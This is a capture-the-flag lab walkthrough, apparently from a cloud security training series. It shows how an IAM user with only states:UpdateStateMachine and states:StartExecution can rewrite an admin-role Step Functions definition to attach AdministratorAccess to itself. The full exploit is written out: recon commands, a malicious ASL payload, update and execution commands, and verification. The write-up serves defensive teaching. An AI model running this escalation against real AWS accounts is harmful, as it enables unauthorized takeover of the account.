# Solution: UpdateStateMachine + StartExecution on Existing Admin-Role State Machine

AWS Step Functions is primarily thought of as an orchestration service — a way to coordinate Lambda functions, ECS tasks, and other compute into workflows. What's less obvious is that it can also act as a privilege escalation vector when a principal holds `states:UpdateStateMachine` on a state machine whose execution role carries sensitive permissions.

The key mechanic is subtle: AWS only requires `iam:PassRole` when you *change* a state machine's execution role. If you leave `roleArn` unchanged and only update the `definition`, no PassRole check happens at all. Combined with Step Functions' native AWS SDK integration — which lets state machine task states call almost any AWS API using the execution role — this means a principal with just two permissions (`states:UpdateStateMachine` and `states:StartExecution`) can effectively invoke any IAM action that the execution role permits, including attaching `AdministratorAccess` to themselves.

This pattern is the existing-resource twin of `stepfunctions-001` (which requires creating a new state machine and explicitly passing a privileged role). Here, the privileged role is already attached — making this an "existing-passrole" escalation that looks deceptively low-risk from a permission-surface perspective.

## The Challenge

You have obtained credentials for `pl-prod-stepfunctions-002-to-admin-starting-user` — a low-privilege IAM user with a narrow policy granting only `states:UpdateStateMachine` and `states:StartExecution` on a specific state machine, plus a handful of read-only Step Functions permissions for reconnaissance. The user has no IAM write permissions and no `iam:PassRole`.

Your goal is to reach `AdministratorAccess` and read the CTF flag from SSM Parameter Store. Somewhere in the account is a Step Functions state machine with an admin execution role already attached. The path runs through that machine's definition.

Set your credentials and confirm your starting identity:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see yourself as `pl-prod-stepfunctions-002-to-admin-starting-user`. Now confirm you can't yet touch anything sensitive:

```bash
aws ssm get-parameter --name /pathfinding-labs/flags/stepfunctions-002-to-admin
# AccessDeniedException: User is not authorized to perform: ssm:GetParameter
```

Good. No admin access yet.

## Reconnaissance

Start by discovering what state machines exist in the account:

```bash
aws stepfunctions list-state-machines --query 'stateMachines[*].[name,stateMachineArn]' --output table
```

You'll see `pl-prod-stepfunctions-002-to-admin-statemachine` listed. Inspect it to understand its current definition and — critically — its execution role:

```bash
aws stepfunctions describe-state-machine \
  --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine
```

The output shows a benign initial definition (a Pass state that does nothing), but more importantly, it shows the `roleArn` field: `arn:aws:iam::{account_id}:role/pl-prod-stepfunctions-002-to-admin-statemachine-role`. That role is what makes this exploitable. If you have access to IAM enumeration tools, you can confirm it holds `AdministratorAccess`:

```bash
aws iam list-attached-role-policies \
  --role-name pl-prod-stepfunctions-002-to-admin-statemachine-role
```

The key insight lands here: this state machine has an admin role. And you can replace its definition without touching its role.

## Exploitation

The attack has two steps: rewrite the definition, then pull the trigger.

First, craft a malicious ASL definition. Step Functions' AWS SDK integration lets any Task state call an AWS API directly using the execution role, without any Lambda or compute in between. The syntax is `arn:aws:states:::aws-sdk:{service}:{action}`. You want to call `iam:AttachUserPolicy` — in ASL that's the `iam:attachUserPolicy` action:

```bash
cat > /tmp/malicious-def.json <<'EOF'
{
  "Comment": "Escalation payload",
  "StartAt": "AttachAdmin",
  "States": {
    "AttachAdmin": {
      "Type": "Task",
      "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
      "Parameters": {
        "UserName": "pl-prod-stepfunctions-002-to-admin-starting-user",
        "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
      },
      "End": true
    }
  }
}
EOF
```

Now update the state machine's definition. Notice that the command only specifies `--definition` — not `--role-arn`. By omitting `roleArn`, AWS does not perform a `PassRole` check:

```bash
aws stepfunctions update-state-machine \
  --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine \
  --definition file:///tmp/malicious-def.json
```

A successful response includes an `updateDate` timestamp. The definition is now live.

Wait a few seconds for the update to take effect, then start an execution:

```bash
aws stepfunctions start-execution \
  --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine
```

The execution begins immediately. Step Functions assumes `pl-prod-stepfunctions-002-to-admin-statemachine-role` (which holds `AdministratorAccess`) and runs the `AttachAdmin` task, calling `iam:AttachUserPolicy` to attach `AdministratorAccess` to your starting user. The execution typically completes in under 10 seconds.

You can monitor it if you want:

```bash
EXEC_ARN=$(aws stepfunctions start-execution \
  --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine \
  --query 'executionArn' --output text)

aws stepfunctions describe-execution --execution-arn "$EXEC_ARN" \
  --query '[status,stopDate]' --output text
```

Wait for `SUCCEEDED` in the status field, then allow ~30 seconds for IAM policy attachment to propagate across the AWS control plane.

## Verification

Still using your original starting user credentials, confirm the policy is now attached:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-stepfunctions-002-to-admin-starting-user
```

You should see `AdministratorAccess` in the list. Now test it:

```bash
aws iam list-users --max-items 3 --output table
```

It works. Your starting user credentials now carry full administrator permissions — no credential rotation, no new keys, no role assumption required.

## Capture the Flag

The same starting user credentials that were denied at the beginning now have `AdministratorAccess`, which includes `ssm:GetParameter` on all parameters in the account. Read the CTF flag directly:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/stepfunctions-002-to-admin \
  --query 'Parameter.Value' \
  --output text
```

This returns the flag value for your deployment. The parameter is a `String` type and is returned in plaintext directly.

## What Happened

You exploited a two-permission privilege escalation path that bypasses the `iam:PassRole` check that normally gates Step Functions attacks. The critical precondition was an existing state machine with an admin execution role — a configuration that appears legitimately in many accounts where state machines orchestrate infrastructure automation, security workflows, or compliance checks.

By calling `states:UpdateStateMachine` without changing `roleArn`, you injected a malicious ASL definition that used Step Functions' native AWS SDK integration to call `iam:AttachUserPolicy` on your behalf. The execution role did the IAM work; your principal only needed to write the definition and start the execution.

In real environments this pattern is dangerous precisely because `states:UpdateStateMachine` looks like a developer convenience permission rather than a privilege escalation vector. Teams routinely grant it to CI/CD pipelines and automation accounts for deploying workflow updates. If any of those state machines carry admin execution roles for their legitimate workload, every principal with `UpdateStateMachine` access becomes a potential admin — no PassRole alarm fires, and the IAM event that triggers (`iam:AttachUserPolicy` with `states.amazonaws.com` as the caller) is easy to miss if your SIEM isn't specifically correlating service-principal IAM mutations with recent definition updates.
